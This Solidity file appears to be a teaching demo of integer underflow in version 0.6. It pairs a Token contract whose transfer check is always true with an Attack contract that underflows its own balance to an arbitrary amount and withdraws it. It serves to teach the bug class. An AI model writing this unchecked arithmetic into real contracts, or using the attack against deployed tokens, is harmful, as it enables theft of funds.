// SPDX-License-Identifier: MIT
/*
  Overflow/underflow problems in solidity v6
*/

pragma solidity 0.6.12;

contract Token {
    mapping(address => uint) balances;

    function transfer(address _to, uint _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0); 
        balances[msg.sender] -= _value; 
        balances[_to] += _value; 
        return true;
    }

    function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];
    }
}

contract Attack {
    Token token;
    address attacker;

    modifier onlyMe() {
        require(msg.sender == attacker);
        _;
    }

    constructor(address _token) public {
        token = Token(_token);
        attacker = msg.sender;
    }

    /// @notice Increases contract's token balance by `targetBalance` despite originally having no tokens
    function manipulateBalance(uint targetBalance) external onlyMe {
        token.transfer(address(0), uint(-targetBalance));
    }

    function withdraw() external onlyMe {
        token.transfer(attacker, token.balanceOf(address(this)));
    }
}
